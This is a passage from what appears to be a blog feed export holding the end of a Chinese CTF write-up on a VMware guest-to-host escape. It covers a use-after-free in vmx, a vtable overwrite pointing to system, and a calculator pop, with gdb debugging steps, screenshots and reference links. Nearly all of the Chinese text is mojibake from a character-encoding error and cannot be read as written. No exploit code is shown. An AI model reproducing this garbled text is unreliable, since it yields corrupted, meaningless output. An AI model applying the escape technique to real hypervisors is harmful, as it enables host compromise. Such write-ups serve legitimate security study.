alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹å‡ºæ¥è¿™å—çš„è™šè¡¨è°ƒç”¨ä½ç½®åœ¨FE95B0ï¼Œ+8å³ä¸ºFE95B8ï¼Œæ‰€ä»¥æ­¤å¤„æ”¹ä¸ºsystemç„¶åç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆFE95C0ï¼‰æ”¹ä¸ºï¼Œå¼¹å‡ºè®¡ç®—å™¨çš„æŒ‡ä»¤å³å¯ã€‚</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æ‰“å¼€ç¯å¢ƒï¼Œsshé“¾æ¥guestï¼Œç„¶åsudo gdb .&#x2F;vmx -qï¼Œä½¿ç”¨ps -aux | grep vmxæ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ï¼Œattachä¸Šå»ï¼Œåœ¨sshç«¯å£è¿è¡Œexpå³å¯ï¼ˆè®°å¾—å…ˆæ‰“æ–­ç‚¹ï¼Œæˆ‘æ–­åœ¨äº†æ¼æ´å‡½æ•°freeçš„åœ°æ–¹ï¼Œæ–¹ä¾¿çœ‹chunkï¼‰</p><p>ç¬¬ä¸€æ¬¡freeå‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" alt="å›¾ç‰‡.png"></p><p>ç›´æ¥æŒ‰äº†continueã€‚ã€‚å †åˆ†é…ç‰¹åˆ«ä¹±ï¼Œäºæ˜¯é‡æ–°æ¥è¿‡ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" alt="å›¾ç‰‡.png"></p><p>æ–­ç‚¹æ‰¾å‡ºæ¼æ´å‡½æ•°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" alt="å›¾ç‰‡.png"></p><p>è¿™æ˜¯bufAçš„åœ°å€ã€‚è®°ä½0x7f35000210f0ï¼ˆuserå¼€å¤´åŒºåŸŸï¼‰</p><p>ç»è¿‡UAFä¹‹åï¼Œè¿™é‡ŒæŠŠè™šè¡¨å†™å…¥bufBï¼Œ</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" alt="å›¾ç‰‡.png"></p><p>æŸ¥çœ‹åå‘ç°ç¡®å®æ˜¯vtableã€‚</p><p>åŸºå€å°±å¯ä»¥leakå‡ºæ¥äº†ã€‚åé¢æ˜¯åŸºæœ¬çš„åŠ«æŒfdæ“ä½œï¼Œä¸è°ƒè¯•äº†ï¼Œç›´æ¥çœ‹åˆ°å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" alt="å›¾ç‰‡.png"></p><h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p><p><a href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p><p><a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p><p><a href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
